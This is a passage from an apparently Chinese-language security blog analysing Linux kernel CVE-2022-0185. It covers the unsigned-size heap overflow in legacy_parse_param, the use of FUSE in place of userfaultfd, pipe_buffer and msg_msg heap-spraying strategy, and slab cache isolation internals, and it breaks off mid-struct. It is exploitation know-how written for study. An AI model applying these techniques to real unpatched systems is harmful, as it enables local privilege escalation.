class="string">&#x27;,&#x27;</span>;</span><br><span class="line">len = <span class="built_in">strlen</span>(param-&gt;key);</span><br><span class="line"><span class="built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);</span><br><span class="line">size += len;</span><br><span class="line"><span class="keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;</span><br><span class="line">ctx-&gt;legacy_data[size++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="built_in">string</span>, param-&gt;size);</span><br><span class="line">size += param-&gt;size;</span><br><span class="line">&#125;</span><br><span class="line">ctx-&gt;legacy_data[size] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">ctx-&gt;data_size = size;</span><br><span class="line">ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在<code>ctx-&gt;data_size</code>中取出已拷贝的大小，随后根据<code>param-&gt;type</code>计算出len，若是不存在<code>ctx-&gt;legacy_data</code>则会申请一张页面大小，后续则是从<code>param</code>中取出数据写到<code>ctx-legacy_data</code>中去。</p><p>可以看到在计算出len之后其实是经过了一次判断的，<code>len &gt; PAGE_SIZE - 2 - size</code>这里就是其表达式，不过存在问题的是在函数开头定义<code>size</code>使用的是<code>unsigned int</code>，所以这个判断就成了无符号类型的判断了，一旦<code>size + 2</code>大于<code>PAGE_SIZE</code>那么这个判断是会一直成立的，从而达到了溢出的效果。</p><p>不过这里需要注意的是在前面的<code>fsconfig</code>系统调用实现的函数中在对<code>param</code>进行初始化时使用的是这样一条语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param.<span class="built_in">string</span> = strndup_user(_value, <span class="number">256</span>);</span><br></pre></td></tr></table></figure><p>这里也就限制了我们单次写入的大小只能是<code>0x100</code>个字节，不过可以看到的是在<code>legacy_parse_param</code>函数末尾是又对<code>ctx-&gt;data_size</code>进行了赋值并且值的大小为<code>len + size</code>和<code>size += param-&gt;size;</code>，并且后面在拷贝的时候使用的是<code>ctx-&gt;legacy_data + size</code>。所以我们想要达到溢出的效果需要将<code>size</code>构造为4095。</p><p>前面提到了<code>size</code>最终的值是那两个的和，但其实还存在两个操作会对其做增加操作，也就是在每一条前面都会加上一个<code>&quot;,&quot;</code>而在key后面都会加上一个<code>&quot;=&quot;</code>所以其实写入的最终效果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">,key=val</span><br></pre></td></tr></table></figure><p>所以每一次拷贝的长度其实是<code>strlen(key) + strlen(val) + 2</code></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以预见的是，当我们控制<code>size = 4095</code>时，他会在下一个相邻<code>object</code>写入<code>=</code>以及末尾的一个<code>\x00</code>，所以这里采取的办法是不直接覆盖相邻<code>object</code>的内容，而是直接覆盖掉后一个<code>object</code>的内容。</p><h3 id="FUSE"><a href="#FUSE" class="headerlink" title="FUSE"></a>FUSE</h3><p>在以往的文章中提到了<code>userfaultfd</code>系统调用，可惜的是在<code>Linux 5.11</code>起就不再能用普通用户进行调用了，然而其实<code>FUSE</code>也是可以达到重样的效果的。</p><p>首先简单介绍一下<code>FUSE</code>，即用户空间文件系统，该功能允许非特权用户在用户空间实现一个用户态文件系统，开发者只需要实现对应的文件操作接口就可以在用户空间实现一个文件系统，而不需要重新编译内核，这给开发者提供了相当的便利。</p><p><code>FUSE</code> 自 <code>Linux 2.6.14</code> 版本引入，主要由两部分组成：</p><ul><li>FUSE 内核模块，负责与 kernel 的 VFS 进行交互，并向用户空间实现的文件系统进程暴露 <code>/dev/fuse</code> 块设备接口</li><li><a class="link"   href="https://github.com/libfuse/libfuse" >用户空间的 libfuse 库<i class="fas fa-external-link-alt"></i></a> 负责向用户程序提供封装好的接口，开发者基于该库进行用户空间文件系统的开发：由一个 <code>FUSE daemon</code> 守护进程负责与内核模块进行交互并进行文件系统的具体操作</li></ul><p><img   src="/images/zDwY7GMZQkE2c9m.png" ></p><p>FUSE 的基本运行原理如下：</p><ul><li><code>FUSE daemon</code> 守护进程通过 libfuse 库的 <code>fuse_main()</code> 注册文件系统与对应的处理函数，并挂载到对应的目录下（例如 <code>/mnt/fuse</code>）</li><li>用户进程访问挂载点下的文件（例如 <code>/mnt/fuse/file</code>），来到内核中的 VFS 对应 inode 的 <code>inode_operations</code> 中的处理函数，交由 FUSE 内核模块进行处理</li><li>FUSE 内核模块将请求转换为与用户态 daemon 进程间约定的格式，交由用户态对应的 <code>FUSE daemon</code> 守护进程进行处理</li><li>在 <code>FUSE daemon</code> 调用文件系统创建时注册的对应的处理函数，这一步可能会需要访问实际的文件系统</li><li><code>FUSE daemon</code> 完成处理，返回结果至 FUSE 内核模块，再经由 VFS 返回给用户进程</li></ul><p><img   src="/images/9q3VSGepCnKzbuB.png" ></p><p>这里不过多介绍了，后面就说说基本用法就行了，也和<code>userfaultfd</code>类似，是一个模板。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fuse_operations</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> (*getattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct stat *, struct fuse_file_info *fi);</span><br><span class="line"><span class="keyword">int</span> (*readlink) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line"><span class="keyword">int</span> (*mknod) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>, <span class="keyword">dev_t</span>);</span><br><span class="line"><span class="keyword">int</span> (*mkdir) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>);</span><br><span class="line"><span class="comment">/** Remove a file */</span></span><br><span class="line"><span class="keyword">int</span> (*unlink) (<span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line"><span class="comment">/** Remove a directory */</span></span><br><span class="line"><span class="keyword">int</span> (*rmdir) (<span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line"><span class="comment">/** Create a symbolic link */</span></span><br><span class="line"><span class="keyword">int</span> (*symlink) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line"><span class="keyword">int</span> (*rename) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags);</span><br><span class="line"><span class="keyword">int</span> (*link) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line"><span class="keyword">int</span> (*chmod) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>, struct fuse_file_info *fi);</span><br><span class="line"><span class="keyword">int</span> (*chown) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">uid_t</span>, <span class="keyword">gid_t</span>, struct fuse_file_info *fi);</span><br><span class="line"><span class="keyword">int</span> (*truncate) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">off_t</span>, struct fuse_file_info *fi);</span><br><span class="line"><span class="keyword">int</span> (*open) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*read) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">     struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*write) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">      struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*statfs) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct statvfs *);</span><br><span class="line"><span class="keyword">int</span> (*flush) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*release) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*fsync) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*setxattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">int</span> (*getxattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line"><span class="keyword">int</span> (*listxattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line"><span class="keyword">int</span> (*removexattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line"><span class="keyword">int</span> (*opendir) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*readdir) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">void</span> *, <span class="keyword">fuse_fill_dir_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">struct fuse_file_info *, <span class="keyword">enum</span> fuse_readdir_flags);</span><br><span class="line"><span class="keyword">int</span> (*releasedir) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*fsyncdir) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">void</span> *(*init) (struct fuse_conn_info *conn,</span><br><span class="line">       struct fuse_config *cfg);</span><br><span class="line"><span class="keyword">void</span> (*destroy) (<span class="keyword">void</span> *private_data);</span><br><span class="line"><span class="keyword">int</span> (*access) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">int</span> (*create) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*lock) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *, <span class="keyword">int</span> cmd,</span><br><span class="line">     struct flock *);</span><br><span class="line"> <span class="keyword">int</span> (*utimens) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> struct timespec tv[<span class="number">2</span>],</span><br><span class="line"> struct fuse_file_info *fi);</span><br><span class="line"><span class="keyword">int</span> (*bmap) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span> blocksize, <span class="keyword">uint64_t</span> *idx);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> FUSE_USE_VERSION &lt; 35</span></span><br><span class="line"><span class="keyword">int</span> (*ioctl) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span> cmd, <span class="keyword">void</span> *arg,</span><br><span class="line">      struct fuse_file_info *, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">void</span> *data);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">int</span> (*ioctl) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">void</span> *arg,</span><br><span class="line">      struct fuse_file_info *, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">void</span> *data);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> (*poll) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *,</span><br><span class="line">     struct fuse_pollhandle *ph, <span class="keyword">unsigned</span> *reventsp);</span><br><span class="line"><span class="keyword">int</span> (*write_buf) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_bufvec *buf, <span class="keyword">off_t</span> off,</span><br><span class="line">  struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*read_buf) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_bufvec **bufp,</span><br><span class="line"> <span class="keyword">size_t</span> size, <span class="keyword">off_t</span> off, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*flock) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *, <span class="keyword">int</span> op);</span><br><span class="line"><span class="keyword">int</span> (*fallocate) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">off_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">  struct fuse_file_info *);</span><br><span class="line"><span class="keyword">ssize_t</span> (*copy_file_range) (<span class="keyword">const</span> <span class="keyword">char</span> *path_in,</span><br><span class="line">    struct fuse_file_info *fi_in,</span><br><span class="line">    <span class="keyword">off_t</span> offset_in, <span class="keyword">const</span> <span class="keyword">char</span> *path_out,</span><br><span class="line">    struct fuse_file_info *fi_out,</span><br><span class="line">    <span class="keyword">off_t</span> offset_out, <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags);</span><br><span class="line"><span class="keyword">off_t</span> (*lseek) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">off_t</span> off, <span class="keyword">int</span> whence, struct fuse_file_info *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在使用时需要先实现上面函数表中的函数接口，我们自定义的用户态文件系统的操作其实都是通过对该函数表中定义的函数回调实现的。</p><p>不难想到，注册一个用户空间文件系统，为读写等接口注册回调函数，使用 mmap 将该文件系统中的一个文件映射到内存中，当进程在内核中读写这块 mmap 内存时，便会触发缺页异常，此时控制权便会转交到我们注册的回调函数当中，然而在回调函数中的操作是我们可以控制的，所以效果就很类似于<code>userfaultfd</code>了。</p><p>不过常规的 libfuse 库并不支持静态编译，这使得我们无法像以往一样先静态编译一个 exp 再传到远程，不过在此CVE的github仓库中存在其静态编译的操作。<a class="link"   href="https://github.com/Crusaders-of-Rust/CVE-2022-0185" >https://github.com/Crusaders-of-Rust/CVE-2022-0185<i class="fas fa-external-link-alt"></i></a></p><h3 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h3><p>这里有两种利用方式，首先就是我们在 <a class="link"   href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/" >向pipe_buffer说yes！<i class="fas fa-external-link-alt"></i></a> 文章中提到的使用<code>pipe_buffer</code>构造出页级的UAF，最终实现任意地址读写。这里简单介绍一下在这个漏洞中如何使用就行，不过多停留了 <del>绝对不是因为我是懒狗不想写exp</del> ，这篇文章重点还是看<code>FUSE</code>的用法，所以具体还是在另一种利用手法。</p><p>首先，在开始<code>size = 4095</code>时即便是传入的<code>key</code>为<code>\x00</code>时也会在下一个<code>object</code>中写入一个<code>&quot;=&quot;</code>，所以不幸的是不能直接修改下一个紧邻的<code>pipe_buffer-&gt;page</code>。前面也提到了这里选择的方式修改下一个<code>object</code>紧邻的下一个<code>object</code>，不过我们如果单纯使用<code>pipe_buffer</code>进行堆喷时会出现一个问题，在后续寻找被覆盖<code>page</code>指针的<code>pipe_buffer</code>的<code>idx</code>时会出现一个大问题，那就是因为前面修改导致读取<code>pipe</code>时导致<code>kernel panic</code>。所以a3选择的办法是使用<code>msg_msg</code>进行大量堆喷，通过修改<code>m_ts</code>来判断哪个<code>msg_msg</code>是被覆盖掉了，之后这个<code>msg_msg</code>就不再使用防止出现<code>kernel panic</code>，那此时也就成功将漏洞转化成了<code>off by null</code>了，后续的使用其实就和上面的文章中一致了，不熟悉的朋友可以去看看。</p><p>当然这里还需要考虑的就是<code>order</code>了，此处申请的<code>object</code>对应的<code>order</code>为3。当然，各位知道知道的<code>pipe</code>提供<code>fcntl(F_SETPIPE_SZ)</code>调用可以去修改<code>pipe_buffer</code>的数量，所以可以达到对应的<code>order</code>当然<code>msg_msg</code>同理。</p><h3 id="内部隔离分析"><a href="#内部隔离分析" class="headerlink" title="内部隔离分析"></a>内部隔离分析</h3><p>在看完第一种利用方式的朋友们可能会有点疑惑，”为什么可以使用<code>msg_msg</code>？”。在ctf-wiki中写了”在linux kernel 5.9之前和linux kernel 5.11之后都是存在堆块隔离的”。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">kmalloc_cache_type</span> &#123;</span></span><br><span class="line">KMALLOC_NORMAL = <span class="number">0</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">KMALLOC_DMA = KMALLOC_NORMAL,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line">KMALLOC_CGROUP = KMALLOC_NORMAL,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">KMALLOC_CGROUP,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">KMALLOC_RECLAIM,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">KMALLOC_DMA,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">NR_KMALLOC_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在kernel 5.14之后存在如上的<code>cache type</code>，其中常被认为隔离的是<code>KMALLOC_CGROUPT</code>其对应的是flag为<code>GFP_KERNEL_ACCOUNT</code>的申请，可以在<code>slabinfo</code>文件中看到其cache的名字为<code>kmalloc-cg-*</code>。而<code>GFP_KERNEL</code>则对应的就是<code>KMALLOC_NORMAL</code>类型，在<code>slabinfo</code>中就是普通的<code>kmalloc-*</code>。</p><p><strong>下面简单介绍一下内存隔离的原理：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line"><span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!index)</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> kmem_cache_alloc_trace(</span><br><span class="line">kmalloc_caches[kmalloc_type(flags)][index],</span><br><span class="line">flags, size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在内核<code>kmalloc</code>的实现里面可以看到的是，会给<code>kmem_cache_alloc_trace</code>传入一个cache，另外<code>kmalloc_caches</code>是一个二重数组，首先是根据对应的<code>type</code>然后根据<code>size</code>确定不同的<code>index</code>取出最终的<code>cache</code>。</p><p>这里重点看一下<code>kmalloc_type</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_NOT_NORMAL_BITS\</span></span><br><span class="line"><span class="meta">(__GFP_RECLAIMABLE |\</span></span><br><span class="line"><span class="meta">(IS_ENABLED(CONFIG_ZONE_DMA)   ? __GFP_DMA : 0) |\</span></span><br><span class="line"><span class="meta">(IS_ENABLED(CONFIG_MEMCG_KMEM) ? __GFP_ACCOUNT : 0))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">enum</span> kmalloc_cache_type <span class="title">kmalloc_type</span><span class="params">(<span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The most common case is KMALLOC_NORMAL, so test for it</span></span><br><span class="line"><span class="comment"> * with a single branch for all the relevant flags.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (likely((flags &amp; KMALLOC_NOT_NORMAL_BITS) == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> KMALLOC_NORMAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * At least one of the flags has to be set. Their priorities in</span></span><br><span class="line"><span class="comment"> * decreasing order are:</span></span><br><span class="line"><span class="comment"> *  1) __GFP_DMA</span></span><br><span class="line"><span class="comment"> *  2) __GFP_RECLAIMABLE</span></span><br><span class="line"><span class="comment"> *  3) __GFP_ACCOUNT</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_ZONE_DMA) &amp;&amp; (flags &amp; __GFP_DMA))</span><br><span class="line"><span class="keyword">return</span> KMALLOC_DMA;</span><br><span class="line"><span class="keyword">if</span> (!IS_ENABLED(CONFIG_MEMCG_KMEM) || (flags &amp; __GFP_RECLAIMABLE))</span><br><span class="line"><span class="keyword">return</span> KMALLOC_RECLAIM;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> KMALLOC_CGROUP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要看一下<code>KMALLOC_NOT_NORMAL_BITS</code>的定义，因为kernel默认存在<code>CONFIG_MEMCG_KMEM</code>选项所以添加了<code>__GFP_ACCOUNT</code>标识为，以至于flag为<code>GFP_KERNEL_ACCOUNT</code>时不会直接返回<code>KMALLOC_NORMAL</code>了，这也就导致了堆块隔离。</p><p>根据上面的分析会发现在<code>linux kernel 5.9</code>之前确实没有<code>KMALLOC_CGROUP</code>这样一个新建的<code>kmem_cache</code>，不过其实在此之前依旧是存在隔离的，这里分析一下在<code>linux kernel 5.9</code>之前的隔离实现原理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line"><span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line"><span class="keyword">slab_flags_t</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset;<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line"><span class="keyword">gfp_t</span> allocflags;<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line"><span class="keyword">int</span> refcount;<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line"><span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;<span class="comment">/* Offset to metadata */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> align;<span class="comment">/* Alignment */</span></span><br><span 